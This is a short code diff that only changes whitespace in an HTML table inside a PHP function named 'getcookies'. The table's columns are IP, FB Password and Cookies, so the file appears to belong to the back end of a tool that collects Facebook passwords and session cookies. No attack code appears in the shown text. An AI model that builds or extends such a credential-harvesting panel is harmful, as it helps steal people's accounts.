@@ -107,7 +107,7 @@ public function getcookies(Request $reqeust, $id)
             <table id="example2" class="table table-bordered table-striped" >
                      <thead>
 
-                       <tr>             
+                    <tr>             
                     
                       
                        <th>IP</th>
@@ -116,8 +116,7 @@ public function getcookies(Request $reqeust, $id)
                        <th>FB Password</th>
                        <th>Cookies</th>                      
                        
-                       <th></th>
-                      
+                       <th></th>    
                        
                      
                      </tr>
